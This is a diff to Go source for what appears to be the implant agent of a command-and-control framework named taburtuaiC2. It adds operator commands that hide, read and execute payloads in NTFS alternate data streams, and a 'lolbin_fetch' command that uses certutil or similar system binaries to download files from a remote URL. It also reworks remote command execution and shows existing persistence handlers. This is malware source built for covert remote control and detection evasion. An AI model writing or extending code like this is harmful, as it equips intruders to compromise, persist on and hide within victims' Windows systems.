@@ -1,10 +1,7 @@
 package main
 
 import (
-	"bytes"
-	"context"
 	"encoding/base64"
-//	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -12,7 +9,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/mjopsec/taburtuaiC2/pkg/types"
 )
@@ -53,10 +49,18 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handlePersistenceSetup(cmd, result)
 	case "persist_remove":
 		handlePersistenceRemove(cmd, result)
+	case "ads_write":
+		handleADSWrite(cmd, result)
+	case "ads_read":
+		handleADSRead(cmd, result)
+	case "ads_exec":
+		handleADSExec(cmd, result)
+	case "lolbin_fetch":
+		handleLOLBinFetch(cmd, result)
 	case "execute":
 		fallthrough
 	default:
-		handleExecute(cmd, result)
+		handleExecute(agent, cmd, result)
 	}
 
 	// Encrypt result if crypto is available
@@ -221,43 +225,80 @@ func handlePersistenceRemove(cmd *types.Command, result *types.CommandResult) {
 	}
 }
 
-func handleExecute(cmd *types.Command, result *types.CommandResult) {
-	ctx := context.Background()
-	if cmd.Timeout > 0 {
-		var cancel context.CancelFunc
-		ctx, cancel = context.WithTimeout(ctx, time.Duration(cmd.Timeout)*time.Second)
-		defer cancel()
+func handleExecute(agent *Agent, cmd *types.Command, result *types.CommandResult) {
+	method := "cmd"
+	if agent != nil && agent.cfg != nil && agent.cfg.ExecMethod != "" {
+		method = agent.cfg.ExecMethod
 	}
-
-	var execCmd *exec.Cmd
-	if len(cmd.Args) > 0 {
-		execCmd = exec.CommandContext(ctx, cmd.Command, cmd.Args...)
-	} else {
-		if runtime.GOOS == "windows" {
-			execCmd = exec.CommandContext(ctx, "cmd", "/C", cmd.Command)
-		} else {
-			execCmd = exec.CommandContext(ctx, "sh", "-c", cmd.Command)
-		}
+	timeout := cmd.Timeout
+	if timeout <= 0 {
+		timeout = 60
 	}
+	stdout, stderr, exitCode := runCommand(method, cmd.Command, timeout)
+	result.Output = stdout
+	result.Error = stderr
+	result.ExitCode = exitCode
+}
 
-	var stdout, stderr bytes.Buffer
-	execCmd.Stdout = &stdout
-	execCmd.Stderr = &stderr
+func handleLOLBinFetch(cmd *types.Command, result *types.CommandResult) {
+	if cmd.FetchURL == "" || cmd.DestinationPath == "" {
+		result.Error = "lolbin_fetch requires fetch_url and destination_path"
+		result.ExitCode = 1
+		return
+	}
+	method := cmd.FetchMethod
+	if method == "" {
+		method = "certutil"
+	}
+	if err := lolbinFetch(cmd.FetchURL, cmd.DestinationPath, method); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Fetched via %s → %s", method, cmd.DestinationPath)
+}
 
-	err := execCmd.Run()
-	result.Output = strings.TrimSpace(stdout.String())
-	result.Error = strings.TrimSpace(stderr.String())
+func handleADSWrite(cmd *types.Command, result *types.CommandResult) {
+	if cmd.DestinationPath == "" || len(cmd.FileContent) == 0 {
+		result.Error = "ads_write requires destination_path (ADS path) and file_content"
+		result.ExitCode = 1
+		return
+	}
+	if err := adsWrite(cmd.DestinationPath, cmd.FileContent); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("Written %d bytes to ADS: %s", len(cmd.FileContent), cmd.DestinationPath)
+}
 
+func handleADSRead(cmd *types.Command, result *types.CommandResult) {
+	if cmd.SourcePath == "" {
+		result.Error = "ads_read requires source_path (ADS path)"
+		result.ExitCode = 1
+		return
+	}
+	data, err := adsRead(cmd.SourcePath)
 	if err != nil {
-		if exitError, ok := err.(*exec.ExitError); ok {
-			result.ExitCode = exitError.ExitCode()
-		} else {
-			result.ExitCode = 1
-			if result.Error == "" {
-				result.Error = err.Error()
-			}
-		}
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
 	}
+	result.Output = string(data)
+}
+
+func handleADSExec(cmd *types.Command, result *types.CommandResult) {
+	if cmd.SourcePath == "" {
+		result.Error = "ads_exec requires source_path (ADS path, e.g. C:\\file.txt:payload.js)"
+		result.ExitCode = 1
+		return
+	}
+	out, err := adsExec(cmd.SourcePath)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+	}
+	result.Output = out
 }
 
 func encryptResult(agent *Agent, result *types.CommandResult) {
